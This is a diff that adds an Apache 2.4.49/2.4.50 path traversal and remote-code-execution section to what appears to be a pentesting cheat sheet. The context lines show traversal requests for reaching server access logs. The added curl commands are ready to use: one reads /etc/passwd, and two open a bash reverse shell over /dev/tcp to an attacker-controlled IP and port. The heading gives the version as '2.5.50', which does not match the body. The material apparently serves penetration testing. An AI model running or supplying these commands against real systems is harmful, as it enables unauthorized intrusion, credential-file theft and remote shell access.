@@ -92,3 +92,20 @@ curl -s --path-as-is $TARGET_URL/../../../../../../../../../var/log/apache2/acce
 #windows using xampp
 curl -s --path-as-is $TARGET_URL/../../../../../../../../../xampp/apache/logs/access.log&exec=dir
 ```
+
+
+Apache 2.4.49 / Apache 2.5.50 Path traversal and RCE:
+---
+#apache-rce #apache-2449 #apache-2550 
+read /etc/passwd:
+```bash
+curl -s --path-as-is -d "echo Content-Type: text/plain; echo; " "$TARGET_IP/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+```
+execute /bin/bash for a reverse shell in 2.4.49:
+```bash
+curl -s --path-as-is -d "echo Content-Type: text/plain; echo; bash -c \"bash -i >& /dev/tcp/$LOCAL_IP/4444 0>&1\"" "$TARGET_IP/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
+```
+and for 2.4.50:
+```bash
+curl -s --path-as-is -d "echo Content-Type: text/plain; echo; bash -c \"bash -i >& /dev/tcp/$LOCAL_IP/4444 0>&1\"" "$TARGET_IP/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash"
+```
